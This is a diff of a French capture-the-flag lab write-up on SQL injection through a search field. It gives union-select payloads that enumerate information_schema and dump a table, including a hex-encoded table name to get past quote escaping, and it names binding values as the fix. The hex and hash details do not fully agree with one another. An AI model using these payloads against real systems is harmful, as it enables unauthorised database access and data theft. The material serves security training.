@@ -1,28 +1,24 @@
+Security breach name 	: Injection Sql
 
-On display les informations concernant la base de donnée SQL grace a information_schema.tables
+Principle 				: Utilisé des inputs mal protégés pour accéder à des données sensibles de la base de données, en modifiant les requêtes faites sur celle-ci.
 
-Dans la barre de recherche de la page 'image':
-1 union select table_schema,table_name from information_schema.tables
+Solve 					: Ne pas insérer directement les valeurs entré par un utilisateur dans une requête Sql, il existe plusieurs méthodes : binder les valeurs, stringifier les valeurs..
 
-On voit qu'il existe une table list_images, il faut maintenant récupérer la value des columns pour trouver un couple identifiant/mot de passe. Pour contrer la sécurité sur les quotes qui nous empêche de demander directement la table users on convertit le nom de la table en hexa.
+In case 				: Dans la barres de recherche membre, la valeurs entré est diretement inséré dans la requêtes ce qui nous permet dans une certaines mesures de modifier sont sens. 
+							(La requêtes n'accepte que deux arguments pour le select)
+							
+							1 - 1 union select table_schema,table_name from information_schema.tables , nous permet de faire apparaître l'ensemble des informations promaires concernant la base de données.
 
-1 union select null,group_concat(column_name) from information_schema.columns where table_name = 0x6c6973745f696d61676573 # (0x6c6973745f696d61676573 == users en hexa seul moyen pour que table_name accept l'input)
+							2 - 1 union select null,group_concat(column_name) from information_schema.columns where table_name = 0x6c6973745f696d61676573 , les quotes étant échappées par le contrôleur on modifie la valeur de du string par sa valeur hexa ce qui nous permet de nous passer des quotes.
 
-
-Il nous reste plus qu'a choisir les columns que l'on souhaite
-
-
-1 union select title,comment from list_images
-
-
-result : 
-
-ID: 1 union select title,comment from list_images 
-Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
-Url : Hack me ?
-
-
-
-md5 hash : 5928e8083cf461a51303633093573c46 =  albatroz
-lower all char  = fortytwo
-hash Sh256 = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+							3 - 1 union select title,comment from list_images
+							{
+								ID: 1 union select title,comment from list_images 
+								Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+								Url : Hack me ?
+							}
+							{
+								md5 hash : 5928e8083cf461a51303633093573c46 =  albatroz
+								lower all char  = fortytwo
+								hash Sh256 = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+							}
